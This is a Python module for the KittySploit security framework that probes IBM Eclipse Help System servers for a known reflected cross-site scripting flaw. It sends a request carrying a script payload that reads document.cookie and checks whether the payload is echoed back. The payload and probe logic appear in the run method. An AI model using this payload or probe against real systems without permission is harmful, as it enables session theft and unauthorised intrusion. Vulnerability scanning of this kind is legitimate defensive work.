#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""IBM Eclipse Help System 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'IBM Eclipse Help System - Cross-Site Scripting Detection',
        'description': 'IBM Eclipse Help System 6.1.0 through 6.1.0.6, 6.1.5 through 6.1.5.3, 7.0 through 7.0.0.2, and 8.0 prior to 8.0.0.1 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'ibm', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/131924/IBM-Eclipse-Help-System-IEHS-Cross-Site-Scripting.html',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.cookie)</script>', 'file not found',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="IBM Eclipse Help System - Cross-Site Scripting detected",
                path='/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E',
            )
            return True
        return False

